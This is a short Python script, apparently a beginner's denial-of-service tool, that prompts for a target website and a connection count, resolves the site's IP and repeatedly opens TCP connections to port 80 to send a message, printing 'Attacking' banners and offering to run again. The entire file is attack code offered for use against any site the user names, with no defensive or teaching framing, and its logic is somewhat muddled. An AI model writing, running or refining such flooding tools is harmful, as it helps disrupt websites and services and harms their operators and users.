import socket
import os
import sys


def restart_program():
    # Retrieves the path to the Python interpreter currently running this script
    python = sys.executable
    # Replaces the current process with a new instance of Python with the same script
    os.execl(python, python, * sys.argv)


def dos(host, ip):
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    message = "Hello World"
    port = 80

    # Add try except block to handle errors
    try:
        ddos.connect((host, port))
        ddos.send(message.encode())
        ddos.sendto(message.encode(), (ip, port))
    except socket.error as msg:
        # Handling connection errors if they occur
        print("|     [Connection Failed]    |")
        print("|    [DDoS Attack Engaged]    |")

    # Closing the socket
    ddos.close()


def main():
    print("DDoS Mode Loaded")

    # Take host name and number of connections from the user
    host = input("Site you want to DDoS:")
    conn = int(input("How many connections you want to make:"))

    ip = socket.gethostbyname(host)
    print("[" + ip + "]")
    print("[ Ip is locked ]")
    print("[ Attacking " + host + " ]")

    print("+----------------------------+")

    # Write for loop to send multiple dos request on server
    for i in range(1, conn):
        dos(host, ip)

    print("+----------------------------+")
    # Notify the user after requsted connections are finished
    print("The connections you requested had finished")


main()

# Handle restart program
answer = input("Do you want to ddos more?")
if answer.strip() in "y Y yes Yes YES".split():
    restart_program()
else:
    exit()
